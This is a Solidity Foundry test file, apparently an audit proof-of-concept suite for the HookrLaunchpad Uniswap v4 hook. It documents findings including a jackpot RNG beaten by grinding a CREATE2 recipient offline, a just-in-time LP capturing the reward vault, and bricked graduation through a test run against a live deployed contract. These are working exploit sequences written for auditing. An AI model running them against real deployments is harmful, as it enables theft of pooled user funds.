// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {SwapParams, ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";

import {HookrLaunchpad} from "../src/HookrLaunchpad.sol";
import {HookrHook} from "../src/HookrHook.sol";
import {HookrToken} from "../src/HookrToken.sol";
import {V4PoolMath} from "../src/libraries/V4PoolMath.sol";
import {HookMiner} from "./utils/HookMiner.sol";

/// @notice Minimal liquidity router: adds/removes/collects on behalf of its caller and forwards
///         every proceed straight back. Deliberately tiny so this suite carries no extra deps.
contract LpRouter is IUnlockCallback {
    IPoolManager public immutable pm;

    constructor(IPoolManager pm_) {
        pm = pm_;
    }

    receive() external payable {}

    function modify(PoolKey memory key, ModifyLiquidityParams memory params)
        external
        payable
        returns (BalanceDelta feesAccrued)
    {
        feesAccrued = abi.decode(pm.unlock(abi.encode(msg.sender, key, params)), (BalanceDelta));
        if (address(this).balance > 0) {
            (bool ok,) = msg.sender.call{value: address(this).balance}("");
            require(ok, "eth back");
        }
        address token = Currency.unwrap(key.currency1);
        uint256 bal = HookrToken(token).balanceOf(address(this));
        if (bal > 0) HookrToken(token).transfer(msg.sender, bal);
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "not pm");
        (address sender, PoolKey memory key, ModifyLiquidityParams memory params) =
            abi.decode(data, (address, PoolKey, ModifyLiquidityParams));

        (BalanceDelta callerDelta, BalanceDelta feesAccrued) = pm.modifyLiquidity(key, params, "");

        if (callerDelta.amount0() < 0) {
            pm.sync(key.currency0);
            pm.settle{value: uint256(uint128(-callerDelta.amount0()))}();
        } else if (callerDelta.amount0() > 0) {
            pm.take(key.currency0, address(this), uint256(uint128(callerDelta.amount0())));
        }

        address token = Currency.unwrap(key.currency1);
        if (callerDelta.amount1() < 0) {
            uint256 owed = uint256(uint128(-callerDelta.amount1()));
            pm.sync(key.currency1);
            HookrToken(token).transferFrom(sender, address(pm), owed);
            pm.settle();
        } else if (callerDelta.amount1() > 0) {
            pm.take(key.currency1, address(this), uint256(uint128(callerDelta.amount1())));
        }
        return abi.encode(feesAccrued);
    }
}

/// @notice Minimal CREATE2-deployable contract an attacker uses as the jackpot recipient so the
///         recipient address (an input to the "random" roll) can be ground offline.
contract Claimer {
    function claim(HookrHook hook) external {
        hook.claim();
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {}
}

contract AuditTest is Test {
    using StateLibrary for IPoolManager;

    IPoolManager constant PM = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);
    uint160 constant HOOK_FLAGS = uint160((1 << 13) | (1 << 7) | (1 << 3));
    uint96 constant TARGET = 0.01 ether;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 constant POT_NONCE_SLOT = 9;

    HookrLaunchpad pad;
    HookrHook hook;
    PoolSwapTest router;
    LpRouter lpRouter;

    address creator = address(0xC0FFEE);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address attacker = address(0xBADBAD);

    function setUp() public {
        vm.createSelectFork("robinhood");
        assertEq(block.chainid, 4663);

        pad = new HookrLaunchpad(PM);
        bytes memory creation = abi.encodePacked(type(HookrHook).creationCode, abi.encode(PM, address(pad)));
        (address predicted, bytes32 salt) = HookMiner.find(address(this), HOOK_FLAGS, creation);
        hook = new HookrHook{salt: salt}(PM, address(pad));
        assertEq(address(hook), predicted);
        pad.setHook(hook);

        router = new PoolSwapTest(PM);
        lpRouter = new LpRouter(PM);

        vm.deal(creator, 100 ether);
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        vm.deal(attacker, 100 ether);
    }

    // ------------------------------------------------------------ helpers

    function _baseParams() internal pure returns (HookrLaunchpad.HookParams memory p) {
        p = HookrLaunchpad.HookParams({
            guardBlocks: 10,
            maxBuyBps: 100,
            snipeTaxPips: 400_000,
            baseFeePips: 3000,
            maxFeePips: 30_000,
            surgeSens: 5,
            burnBps: 100,
            burnTriggerWei: 1e12,
            lpBps: 25,
            potBps: 50,
            potOdds: 2,
            potMinBuyWei: 1e12
        });
    }

    function _launchAndGraduate(HookrLaunchpad.HookParams memory p, string memory sym)
        internal
        returns (address token, PoolKey memory key)
    {
        HookrLaunchpad.LaunchArgs memory a;
        a.name = sym;
        a.symbol = sym;
        a.tagline = "";
        a.logoURI = "";
        a.targetRaiseWei = TARGET;
        a.blueprintId = 0;
        a.custom = p;

        vm.prank(creator);
        token = pad.launch{value: pad.creationFeeWei()}(a);

        vm.prank(alice);
        pad.buy{value: 0.02 ether}(token, 0);

        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(token),
            fee: 0x800000,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });
    }

    function _buy(address who, PoolKey memory key, uint256 ethIn, bytes memory hookData)
        internal
        returns (BalanceDelta delta)
    {
        vm.prank(who);
        delta = router.swap{value: ethIn}(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethIn), sqrtPriceLimitX96: 4295128740}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            hookData
        );
    }

    // =====================================================================================
    // FINDING 1 — the launchpad accepts maxFeePips == 0 but the hook rejects it, so any
    // launch whose stack omits the Surge-Fees block can NEVER graduate. This is the
    // *default* compile output of the live builder (src/lib/hooks-model.ts compileStack:
    // baseFeePips defaults to 3000, maxFeePips defaults to 0).
    // =====================================================================================

    function test_POC_maxFeeZero_passesLaunchpad_butBricksGraduation() public {
        HookrLaunchpad.HookParams memory p = _baseParams();
        // Exactly what compileStack() emits for a stack with no "fee" block:
        p.baseFeePips = 3000; // DEFAULT_BASE_FEE_PIPS
        p.maxFeePips = 0; // no surge block stacked

        HookrLaunchpad.LaunchArgs memory a;
        a.name = "Bricked";
        a.symbol = "BRICK";
        a.targetRaiseWei = TARGET;
        a.blueprintId = 0;
        a.custom = p;

        // Launch is accepted: _validateHookParams short-circuits on `maxFeePips != 0`.
        vm.prank(creator);
        address token = pad.launch{value: pad.creationFeeWei()}(a);

        // Partial buys work, so real ETH accumulates on the curve.
        vm.prank(bob);
        pad.buy{value: 0.005 ether}(token, 0);
        assertGt(pad.getLaunch(token).reserveWei, 0, "real ETH is on the curve");

        // The buy that completes the curve triggers _graduate -> hook.configurePool -> BadConfig.
        vm.prank(alice);
        vm.expectRevert(HookrHook.BadConfig.selector);
        pad.buy{value: 0.02 ether}(token, 0);

        // ...and it can never succeed, at any size, for anyone, forever.
        vm.prank(bob);
        vm.expectRevert(HookrHook.BadConfig.selector);
        pad.buy{value: 1 ether}(token, 0);

        assertFalse(pad.getLaunch(token).graduated, "token is permanently un-graduatable");
    }

    /// The same params sail through `saveBlueprint`, so one bad blueprint bricks every launch
    /// that ever uses it.
    function test_POC_maxFeeZero_blueprintIsPoisoned() public {
        HookrLaunchpad.HookParams memory p = _baseParams();
        p.maxFeePips = 0;

        vm.prank(bob);
        uint32 id = pad.saveBlueprint("No Surge Block", p, 500);

        HookrLaunchpad.LaunchArgs memory a;
        a.name = "Poisoned";
        a.symbol = "PSN";
        a.targetRaiseWei = TARGET;
        a.blueprintId = id;

        vm.prank(creator);
        address token = pad.launch{value: pad.creationFeeWei()}(a);

        vm.prank(alice);
        vm.expectRevert(HookrHook.BadConfig.selector);
        pad.buy{value: 0.02 ether}(token, 0);
    }

    /// LIVE-STATE PROOF: run against the deployed HookrLaunchpad at
    /// 0x27Cca38E94E3e77BFde2284325DcDb0Da7323579 with the blueprints it already ships.
    /// 4 of the 5 seeded blueprints carry maxFeePips == 0 and are therefore un-graduatable.
    function test_POC_LIVE_seededBlueprintsAreUnGraduatable() public {
        HookrLaunchpad live = HookrLaunchpad(payable(0x27Cca38E94E3e77BFde2284325DcDb0Da7323579));
        HookrHook liveHook = live.hook();
        assertEq(address(liveHook), 0xDaf937d3B7C363e0feC29F5584ce08B0894fe088, "live hook");

        uint32[4] memory broken = [uint32(1), 2, 3, 5]; // Degen Jackpot / Sniper Slayer / Burn Baby Burn / LP Loyalty
        for (uint256 i = 0; i < broken.length; i++) {
            HookrLaunchpad.Blueprint memory bp = live.getBlueprint(broken[i]);
            assertEq(bp.params.maxFeePips, 0, "seeded blueprint has no surge block");
            assertGt(bp.params.baseFeePips, 0, "but a non-zero base fee");

            uint256 snap = vm.snapshotState();
            HookrLaunchpad.LaunchArgs memory a;
            a.name = bp.name;
            a.symbol = "LIVE";
            a.targetRaiseWei = TARGET;
            a.blueprintId = broken[i];

            vm.prank(creator);
            address token = live.launch{value: live.creationFeeWei()}(a);

            // real ETH goes onto the curve...
            vm.prank(bob);
            live.buy{value: 0.005 ether}(token, 0);
            assertGt(live.getLaunch(token).reserveWei, 0);

            // ...and the sellout buy reverts forever.
            vm.prank(alice);
            vm.expectRevert(HookrHook.BadConfig.selector);
            live.buy{value: 0.02 ether}(token, 0);
            assertFalse(live.getLaunch(token).graduated);

            console2.log("live blueprint permanently bricks graduation:", bp.name);
            vm.revertToState(snap);
        }

        // blueprint 4 ("Surge Fees") is the only one that can graduate.
        HookrLaunchpad.LaunchArgs memory ok;
        ok.name = "Surge";
        ok.symbol = "SRG";
        ok.targetRaiseWei = TARGET;
        ok.blueprintId = 4;
        vm.prank(creator);
        address good = live.launch{value: live.creationFeeWei()}(ok);
        vm.prank(alice);
        live.buy{value: 0.02 ether}(good, 0);
        assertTrue(live.getLaunch(good).graduated, "only the surge blueprint graduates");
    }

    // =====================================================================================
    // FINDING 2 — the jackpot RNG is fully attacker-controlled. Every input to the roll is
    // known before the tx, and one of them (`recipient`) is chosen by the swapper, so an
    // attacker grinds a winning recipient offline and wins the whole pot on demand, even at
    // the contract's maximum 1-in-100,000 odds.
    // =====================================================================================

    function test_POC_jackpot_grindRecipient_winsAtMaxOdds() public {
        HookrLaunchpad.HookParams memory p = _baseParams();
        p.potOdds = 100_000; // hardest odds the contract allows
        p.potBps = 500;
        p.burnBps = 0;
        p.lpBps = 0;
        p.potMinBuyWei = 1e12;
        p.guardBlocks = 0;

        (, PoolKey memory key) = _launchAndGraduate(p, "POT");
        PoolId id = key.toId();

        // Honest traders fill the pot.
        for (uint256 i = 0; i < 5; i++) {
            _buy(bob, key, 0.002 ether, abi.encode(bob));
            vm.roll(block.number + 1);
        }
        assertGt(hook.potWei(id), 0, "pot funded");
        assertEq(hook.claimableWei(bob), 0, "honest trader has not won at 1-in-100k");

        // ---- attacker's offline grind: every input to the roll is public and computable.
        uint256 nonceBefore = uint256(vm.load(address(hook), bytes32(POT_NONCE_SLOT)));
        assertEq(nonceBefore, 5, "potNonce slot located (5 honest rolls so far)");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 initHash = keccak256(type(Claimer).creationCode);
        // the roll reads potWei AFTER this buy's own cut has been accrued - trivially predictable
        uint256 pot = hook.potWei(id) + (uint256(p.potMinBuyWei) * p.potBps) / 10_000;

        bytes32 winningSalt;
        address winningRecipient;
        bool found;
        uint256 fmp;
        assembly {
            fmp := mload(0x40)
        }
        for (uint256 s = 0; s < 600_000; s++) {
            address candidate =
                address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), attacker, bytes32(s), initHash)))));
            uint256 roll =
                uint256(keccak256(abi.encodePacked(prevHash, candidate, nonceBefore + 1, address(hook), pot)));
            if (roll % p.potOdds == 0) {
                winningSalt = bytes32(s);
                winningRecipient = candidate;
                found = true;
                break;
            }
            // keep the grind memory-flat; an attacker does this offline for free
            assembly {
                mstore(0x40, fmp)
            }
        }
        assertTrue(found, "grind found a winning recipient");

        // ---- attacker executes: deploy the ground address, make ONE minimum-size buy.
        vm.startPrank(attacker);
        Claimer c = new Claimer{salt: winningSalt}();
        assertEq(address(c), winningRecipient, "CREATE2 address matches the grind");
        vm.stopPrank();

        _buy(attacker, key, p.potMinBuyWei, abi.encode(winningRecipient));

        assertEq(uint256(vm.load(address(hook), bytes32(POT_NONCE_SLOT))), nonceBefore + 1, "one roll consumed");
        assertEq(hook.claimableWei(winningRecipient), pot, "attacker took the entire pot on the first try");
        assertEq(hook.potWei(id), 0, "pot drained");

        uint256 before = attacker.balance;
        vm.prank(attacker);
        c.claim(hook);
        assertEq(attacker.balance, before + pot, "and withdrew it");
        console2.log("pot stolen (wei):", pot);
        console2.log("cost to the attacker: one min-size buy (wei):", uint256(p.potMinBuyWei));
    }

    // =====================================================================================
    // FINDING 3 — flushLpRewards() is permissionless and pays via poolManager.donate(), which
    // splits pro-rata across *current* in-range liquidity. A JIT LP adds liquidity, calls the
    // public flush, and removes in the same transaction, capturing the vault that was meant
    // for the locked protocol-owned position (creator + protocol via collectPoolFees).
    // =====================================================================================

    function test_POC_jitLp_stealsLpRewardVault() public {
        HookrLaunchpad.HookParams memory p = _baseParams();
        p.guardBlocks = 0;
        p.lpBps = 500; // 5% of buys -> LP vault
        p.burnBps = 0;
        p.potBps = 0;
        p.potOdds = 0;
        p.potMinBuyWei = 0;

        (address token, PoolKey memory key) = _launchAndGraduate(p, "JIT");
        PoolId id = key.toId();

        // The attacker first acquires the token leg they need for a two-sided position.
        _buy(attacker, key, 0.05 ether, "");
        uint256 tokenBal = HookrToken(token).balanceOf(attacker);

        // Honest volume then fills the LP-rewards vault.
        _buy(bob, key, 0.05 ether, "");
        uint256 vault = hook.lpVaultWei(id);
        assertGt(vault, 0, "lp vault funded");

        uint128 polLiquidity = PM.getLiquidity(id);
        uint256 attackerEthBefore = attacker.balance;

        (uint160 sqrtP, int24 tick,,) = PM.getSlot0(id);
        int24 lower = (tick / 60) * 60;
        if (tick < 0 && tick % 60 != 0) lower -= 60;
        int24 upper = lower + 60;

        uint160 sqrtLower = V4PoolMath.getSqrtPriceAtTick(lower);
        uint160 sqrtUpper = V4PoolMath.getSqrtPriceAtTick(upper);
        uint128 jitLiquidity = V4PoolMath.getLiquidityForAmounts(sqrtP, sqrtLower, sqrtUpper, 5 ether, tokenBal);

        vm.startPrank(attacker);
        HookrToken(token).approve(address(lpRouter), type(uint256).max);
        lpRouter.modify{value: 6 ether}(
            key,
            ModifyLiquidityParams({
                tickLower: lower,
                tickUpper: upper,
                liquidityDelta: int256(uint256(jitLiquidity)),
                salt: bytes32(0)
            })
        );
        vm.stopPrank();

        uint128 totalLiquidity = PM.getLiquidity(id);
        assertGt(totalLiquidity, polLiquidity, "attacker is now in range");

        // ---- anyone may fire the flush; the attacker fires it while their JIT position is live.
        uint256 vaultAtFlush = hook.lpVaultWei(id);
        assertEq(vaultAtFlush, vault, "vault unchanged by the JIT add");
        vm.prank(attacker);
        hook.flushLpRewards(key);

        // ---- collect (liquidityDelta = 0 surfaces fees only) and unwind.
        vm.startPrank(attacker);
        BalanceDelta collected = lpRouter.modify(
            key, ModifyLiquidityParams({tickLower: lower, tickUpper: upper, liquidityDelta: 0, salt: bytes32(0)})
        );
        lpRouter.modify(
            key,
            ModifyLiquidityParams({
                tickLower: lower,
                tickUpper: upper,
                liquidityDelta: -int256(uint256(jitLiquidity)),
                salt: bytes32(0)
            })
        );
        vm.stopPrank();

        uint256 stolen = uint256(uint128(collected.amount0()));
        console2.log("lp vault donated (wei):    ", vaultAtFlush);
        console2.log("captured by JIT LP (wei):  ", stolen);
        console2.log("capture share (bps):       ", (stolen * 10_000) / vaultAtFlush);
        console2.log("attacker net ETH over the JIT window (wei):", attacker.balance - attackerEthBefore);
        console2.log("attacker token dust left behind (wei):", tokenBal - HookrToken(token).balanceOf(attacker));

        // The JIT LP, in-range for zero blocks and at zero risk, takes the overwhelming
        // majority of a donation the product advertises as going "to in-range LPs".
        assertGt(stolen * 100, vaultAtFlush * 90, "JIT captured >90% of the LP-rewards vault");
        assertGt(attacker.balance, attackerEthBefore, "the JIT round trip is net-profitable in ETH");

        // And the locked POL - whose fees route to creator + protocol - gets the crumbs.
        uint256 creatorBefore = pad.creatorFeesWei(token);
        pad.collectPoolFees(token);
        uint256 polShare = pad.creatorFeesWei(token) - creatorBefore;
        console2.log("POL creator-side share (wei):", polShare);
    }

    // =====================================================================================
    // FINDING 4 — burnTriggerWei is completely unvalidated by the launchpad. A creator (or an
    // imported blueprint) can set it above any level the vault can reach, which permanently
    // strands every wei of buyback fees taken from buyers. There is no admin path out.
    // =====================================================================================

    function test_POC_unreachableBurnTrigger_strandsBuyerFeesForever() public {
        HookrLaunchpad.HookParams memory p = _baseParams();
        p.guardBlocks = 0;
        p.burnBps = 1000; // the max: 10% of every buy
        p.lpBps = 0;
        p.potBps = 0;
        p.potOdds = 0;
        p.potMinBuyWei = 0;
        p.burnTriggerWei = type(uint96).max; // ~7.9e10 ETH: unreachable, and never validated

        (, PoolKey memory key) = _launchAndGraduate(p, "TRAP");
        PoolId id = key.toId();

        _buy(bob, key, 1 ether, "");
        uint256 stranded = hook.burnVaultWei(id);
        assertEq(stranded, 0.1 ether, "10% of the buy was taken from the buyer");

        vm.expectRevert(HookrHook.BuybackBelowTrigger.selector);
        hook.buybackAndBurn(key);

        // Nothing else in the system can ever move burnVaultWei.
        assertEq(hook.burnVaultWei(id), stranded);
        assertGe(address(hook).balance, stranded);
    }

    // =====================================================================================
    // CONTROL — beforeSwap delta sign/slot is CORRECT. Proven by exact accounting: the
    // swapper is debited exactly ethIn, the hook nets exactly the cut, PoolManager's balance
    // moves by the difference, and no unsettled delta remains.
    // =====================================================================================

    function test_control_beforeSwapDelta_signAndSlotAreCorrect() public {
        HookrLaunchpad.HookParams memory p = _baseParams();
        p.guardBlocks = 0;
        p.burnBps = 600;
        p.lpBps = 300;
        p.potBps = 100;
        p.potOdds = 100_000;
        p.potMinBuyWei = type(uint96).max; // disable the roll so accounting is clean
        p.maxFeePips = p.baseFeePips; // disable surge

        (, PoolKey memory key) = _launchAndGraduate(p, "CTRL");
        PoolId id = key.toId();

        uint256 ethIn = 0.001 ether;
        uint256 expectedCut = (ethIn * 1000) / 10_000;

        uint256 swapperBefore = bob.balance;
        uint256 hookBefore = address(hook).balance;
        uint256 pmBefore = address(PM).balance;

        BalanceDelta delta = _buy(bob, key, ethIn, "");

        assertEq(swapperBefore - bob.balance, ethIn, "swapper pays exactly the amount specified");
        assertEq(uint256(uint128(-delta.amount0())), ethIn, "swap delta charges the full gross amount");
        assertGt(delta.amount1(), 0, "swapper still receives tokens");
        assertEq(address(hook).balance - hookBefore, expectedCut, "hook receives exactly the cut - sign is correct");
        assertEq(address(PM).balance - pmBefore, ethIn - expectedCut, "pool nets the remainder");
        assertEq(
            hook.burnVaultWei(id) + hook.lpVaultWei(id) + hook.potWei(id),
            expectedCut,
            "cut fully accounted, no dust lost"
        );
    }

    // =====================================================================================
    // PROBE — is the permissionless, slippage-free buyback sandwichable for profit?
    // =====================================================================================

    function _sell(address who, PoolKey memory key, address token, uint256 amt) internal {
        vm.startPrank(who);
        HookrToken(token).approve(address(router), amt);
        router.swap(
            key,
            SwapParams({
                zeroForOne: false,
                amountSpecified: -int256(amt),
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        vm.stopPrank();
    }

    function test_probe_buybackSandwich() public {
        _probeSandwich(0.005 ether);
        _probeSandwich(0.02 ether);
        _probeSandwich(0.1 ether);
        _probeSandwich(0.3 ether);
    }

    function _probeSandwich(uint256 frontRun) internal {
        uint256 outer = vm.snapshotState();
        console2.log("=== front-run size (wei):", frontRun);
        HookrLaunchpad.HookParams memory p = _baseParams();
        p.guardBlocks = 0;
        p.burnBps = 100;
        p.lpBps = 0;
        p.potBps = 0;
        p.potOdds = 0;
        p.potMinBuyWei = 0;
        p.maxFeePips = p.baseFeePips; // no surge, best case for the sandwicher
        p.burnTriggerWei = 1;

        (address token, PoolKey memory key) = _launchAndGraduate(p, "SNDW");
        PoolId id = key.toId();

        for (uint256 i = 0; i < 5; i++) {
            _buy(bob, key, 0.01 ether, "");
        }
        uint256 vault = hook.burnVaultWei(id);
        console2.log("burn vault (wei):", vault);

        uint256 snap = vm.snapshotState();
        hook.buybackAndBurn(key);
        uint256 honestBurn = hook.totalBurnedTokens(id);
        vm.revertToState(snap);

        uint256 ethBefore = attacker.balance;
        _buy(attacker, key, frontRun, "");
        uint256 got = HookrToken(token).balanceOf(attacker);
        hook.buybackAndBurn(key);
        _sell(attacker, key, token, got);
        int256 pnl = int256(attacker.balance) - int256(ethBefore);
        uint256 sandwichedBurn = hook.totalBurnedTokens(id);

        console2.log("tokens burned, honest:    ", honestBurn);
        console2.log("tokens burned, sandwiched:", sandwichedBurn);
        console2.log("attacker pnl (wei, signed):");
        console2.logInt(pnl);
        assertEq(HookrToken(token).balanceOf(attacker), 0);
        vm.revertToState(outer);
    }

    /// The fee word returned by beforeSwap stays inside LPFeeLibrary's bounds at the ceiling.
    function test_control_feeOverrideWordIsValid() public pure {
        uint24 maxWord = uint24(500_000) | uint24(0x400000);
        assertTrue(maxWord & 0x400000 != 0, "override flag set");
        assertEq(maxWord & 0xBFFFFF, 500_000, "fee parses back to 50%");
        assertLe(uint256(maxWord & 0xBFFFFF), 1_000_000, "<= MAX_LP_FEE");
    }
}
